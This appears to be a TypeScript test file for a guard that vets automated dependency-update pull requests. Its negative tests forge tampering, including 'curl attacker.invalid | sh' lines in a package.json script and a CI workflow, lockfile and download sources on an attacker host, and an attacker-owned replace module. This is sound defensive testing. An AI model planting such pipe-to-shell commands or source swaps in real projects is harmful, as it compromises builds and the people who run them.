import assert from 'node:assert/strict';
import { readdir, readFile } from 'node:fs/promises';
import { test } from 'node:test';
import { z } from 'zod';

import { bot, dependencyUpdate, fakeSource, headCommit } from './fake-source.ts';
import { decide, type Verdict } from './guard.ts';

const changedFile = z.object({ after: z.string(), before: z.string(), path: z.string() });
const lookups = z.record(z.string(), z.string());
const fixtureSchema = z.object({
  files: z.array(changedFile),
  pullRequest: z.number(),
  title: z.string(),
  upstream: z.object({ releaseAssets: lookups, tags: lookups }),
});

type Fixture = z.infer<typeof fixtureSchema>;

const directory = new URL('fixtures/', import.meta.url);
const fixtures = new Map<number, Fixture>();
const fixtureNames = await readdir(directory);
for (const name of fixtureNames) {
  const text = await readFile(new URL(name, directory), 'utf8');
  const fixture = fixtureSchema.parse(JSON.parse(text));
  fixtures.set(fixture.pullRequest, fixture);
}

async function verdictFor({ files, upstream }: Fixture): Promise<Verdict> {
  const repository = dependencyUpdate(files, upstream);
  return decide(fakeSource(repository), bot, { head: headCommit, number: repository.pull.number });
}

for (const fixture of fixtures.values()) {
  void test(`the dependency changes of pull request ${fixture.pullRequest} pass: ${fixture.title}`, async () => {
    const verdict = await verdictFor(fixture);
    assert.equal(verdict.passed, true, verdict.reasons.join('\n'));
  });
}

interface Forgery {
  readonly forge: (text: string) => string;
  readonly name: string;
  readonly path: string;
  readonly pullRequest: number;
}

const forgeries: readonly Forgery[] = [
  {
    forge: (text) => `${text}\nreplace modernc.org/libc => github.com/attacker/libc v1.79.1\n`,
    name: 'a replace directive next to the go.mod update',
    path: 'go.mod',
    pullRequest: 149,
  },
  {
    forge: (text) => text.replace('"lint": "', '"lint": "curl attacker.invalid | sh && '),
    name: 'a script change next to the package update',
    path: 'web/package.json',
    pullRequest: 147,
  },
  {
    forge: (text) =>
      text.replace(/resolution: \{integrity: [^}]+\}/, 'resolution: {tarball: https://attacker.invalid/x.tgz}'),
    name: 'a tarball source in the lockfile update',
    path: 'web/pnpm-lock.yaml',
    pullRequest: 148,
  },
  {
    forge: (text) => text.replace('read_only: true', 'read_only: false'),
    name: 'a container setting next to the image digest update',
    path: 'deploy/compose/compose.yaml',
    pullRequest: 186,
  },
  {
    forge: (text) => text.replace('bb65249542db5fedeeb4d3f9b018b75e7264dbfbbb10486f044581a92f90490d', '0'.repeat(64)),
    name: 'a checksum that is not the upstream digest',
    path: 'tools/dependencies/assets.json',
    pullRequest: 187,
  },
  {
    forge: (text) =>
      text.replace('      - name: Archive', '      - run: curl attacker.invalid | sh\n      - name: Archive'),
    name: 'a run step next to the GoReleaser update',
    path: '.github/workflows/ci.yml',
    pullRequest: 189,
  },
  {
    forge: (text) => text.replace('https://github.com/goreleaser/', 'https://attacker.invalid/goreleaser/'),
    name: 'a foreign download host in the mise lock update',
    path: 'mise.lock',
    pullRequest: 189,
  },
  {
    forge: (text) => text.replace('2.19.0', '3.0.0'),
    name: 'a major version in the mise configuration',
    path: 'mise.toml',
    pullRequest: 189,
  },
  {
    forge: (text) => text.replace('ghcr.io/renovatebot/renovate:', 'ghcr.io/attacker/renovate:'),
    name: 'a Renovate image from another repository',
    path: '.github/workflows/renovate.yml',
    pullRequest: 193,
  },
];

for (const { forge, name, path, pullRequest } of forgeries) {
  void test(`pull request ${pullRequest} with ${name} fails`, async () => {
    const fixture = fixtures.get(pullRequest);
    assert.ok(fixture);
    const files = fixture.files.map((file) => (file.path === path ? { ...file, after: forge(file.after) } : file));
    const forged = files.find((file) => file.path === path);
    assert.notEqual(
      forged?.after,
      fixture.files.find((file) => file.path === path)?.after,
      'the forgery changes the file',
    );
    const verdict = await verdictFor({ ...fixture, files });
    assert.equal(verdict.passed, false, verdict.reasons.join('\n'));
  });
}
